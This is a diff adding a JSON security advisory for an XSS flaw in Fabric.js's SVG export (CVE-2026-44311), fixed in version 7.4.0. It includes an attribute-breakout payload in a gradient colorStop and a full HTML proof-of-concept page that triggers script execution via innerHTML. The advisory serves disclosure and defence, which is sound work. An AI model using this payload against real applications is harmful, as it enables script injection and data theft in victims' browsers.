@@ -1,0 +1,53 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-06-12T21:00:35Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "fabric"
+  },
+  "Advisory": {
+    "DatabaseId": 363003,
+    "Id": "GSA_kwCzR0hTQS13MjJtLWh2dm0teG13eM4ABYn7",
+    "GhsaId": "GHSA-w22m-hvvm-xmwx",
+    "References": [
+      {
+        "Url": "https://github.com/fabricjs/fabric.js/security/advisories/GHSA-w22m-hvvm-xmwx"
+      },
+      {
+        "Url": "https://github.com/fabricjs/fabric.js/releases/tag/v740"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-w22m-hvvm-xmwx"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-w22m-hvvm-xmwx"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-44311"
+      }
+    ],
+    "Description": "### Summary\n\nA potential Cross-Site Scripting (XSS) vulnerability exists in Fabric.js due to improper escaping of user-controlled input during SVG serialization via the `toSVG()` method.\n\nSpecifically, the `color` field within the `colorStops` array of a `fabric.Gradient` object is not properly escaped when converted into SVG `\u003cstop\u003e` elements. If an application renders the generated SVG string into the DOM (e.g., via `innerHTML`), this may allow an attacker to inject arbitrary HTML/SVG and execute JavaScript in the victim's browser.\n\n### Details\n\nDuring SVG export, Fabric.js serializes gradient color stops into `\u003cstop\u003e` elements like:\n\n```xml\n\u003cstop offset=\"0\" stop-color=\"...\"\u003e\u003c/stop\u003e\n```\n\nHowever, the `color` value is inserted into the `stop-color` attribute without proper escaping of special characters such as `\"`, `\u003c`, and `\u003e`. This allows crafted input to break out of the attribute context and inject arbitrary markup.\n\nFor example:\n```js\ncolor: 'red\"\u003e\u003cimg src=\"x\" onerror=\"alert(1)\"\u003e'\n```\n\nmay result in:\n```xml\n\u003cstop offset=\"0\" stop-color=\"red\"\u003e\n\u003cimg src=\"x\" onerror=\"alert(1)\"\u003e\n```\nThis breaks the intended SVG structure and introduces executable HTML.\n\n### PoC (Proof of Concept)\n\nSuccessfully verified on **v7.2.0** (current latest version). The following HTML and JavaScript code reproduces the vulnerability. The code constructs a rectangle with a maliciously crafted gradient color stop and exports it to SVG:\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n   \u003ctitle\u003eFabric.js SVG Export XSS Bypass Test\u003c/title\u003e\n   \u003cscript src=\"[https://cdn.jsdelivr.net/npm/fabric@7.2.0/dist/index.js](https://cdn.jsdelivr.net/npm/fabric@7.2.0/dist/index.js)\"\u003e\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n   \u003ch1\u003eFabric.js SVG Export XSS Bypass Test (Gradient Color)\u003c/h1\u003e\n   \u003ccanvas id=\"c\" width=\"400\" height=\"300\"\u003e\u003c/canvas\u003e\n   \n   \u003ch3\u003eSVG Output Rendering:\u003c/h3\u003e\n   \u003cdiv id=\"svg-output\" style=\"border: 1px solid #ccc; padding: 10px; margin-top: 10px;\"\u003e\u003c/div\u003e\n\n   \u003cscript\u003e\n       setTimeout(() =\u003e {\n           const canvas = new fabric.Canvas('c');\n           \n           // Construct a malicious gradient object\n           const maliciousGradient = new fabric.Gradient({\n               type: 'linear',\n               coords: { x1: 0, y1: 0, x2: 100, y2: 0 },\n               colorStops: [\n                   {\n                       offset: 0,\n                       // Inject XSS payload to prematurely close the attribute/tag\n                       color: 'red\"\u003e\u003cimg src=\"x\" onerror=\"alert(\\'XSS Triggered Successfully!\\')\"\u003e'\n                   },\n                   { offset: 1, color: 'blue' }\n               ]\n           });\n\n           const rect = new fabric.Rect({\n               left: 50, top: 50, width: 300, height: 100,\n               fill: maliciousGradient\n           });\n\n           canvas.add(rect);\n\n           // Export to SVG string containing the malicious code\n           const svgOutput = canvas.toSVG();\n\n           // Render on the page to trigger the XSS\n           document.getElementById('svg-output').innerHTML = svgOutput;\n       }, 100);\n   \u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n### Impact\n\nThis issue can lead to XSS in applications that:\n1. Allow user-controlled input in gradient definitions (e.g., color values)\n2. Use `canvas.toSVG()` to export content\n3. Insert the resulting SVG string into the DOM without sanitization (e.g., via `innerHTML`)\n\nSuccessful exploitation may result in the execution of arbitrary JavaScript in the victim's browser, theft of sensitive data, or unauthorized actions on behalf of the user.\n\n### Suggested Fix\n**Proper Escaping (Recommended)**: Escape special characters in attribute values during SVG serialization.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-12T21:00:32Z",
+    "Severity": "MODERATE",
+    "Summary": "Fabric.js improper escaping in fabric.Gradient colorStops leads to XSS in SVG serialization",
+    "UpdatedAt": "2026-06-12T21:00:35Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "7.4.0"
+      },
+      "VulnerableVersionRange": "\u003c 7.4.0"
+    }
+  ]
+}
